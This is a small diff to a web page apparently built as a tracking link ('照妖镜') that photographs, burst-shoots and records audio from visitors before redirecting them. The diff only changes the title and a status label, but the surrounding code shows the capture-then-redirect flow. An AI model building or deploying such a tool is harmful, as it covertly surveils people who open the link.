@@ -146,7 +146,7 @@
         <div class="card">
             <div class="card-header">
                 <img class="icon" src="3.png" alt="照妖镜图标">
-                <h1>言出法随·照妖镜</h1>
+                <h1>十七同学·照妖镜</h1>
                 <p style="color:#a0a0b0;font-size:13px;">生成链接 · 拍照 · 连拍 · 录音</p>
             </div>
         </div>
@@ -467,7 +467,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
                         } catch (e) {
                             pushLog(`Audio network error: ${e.message}`);
                         }
-                        setStatus('完成 ✓');
+                        setStatus('完成');
                         spinner.classList.add('done');
                         setTimeout(() => location.href = redirectUrl, 1500);
                     };
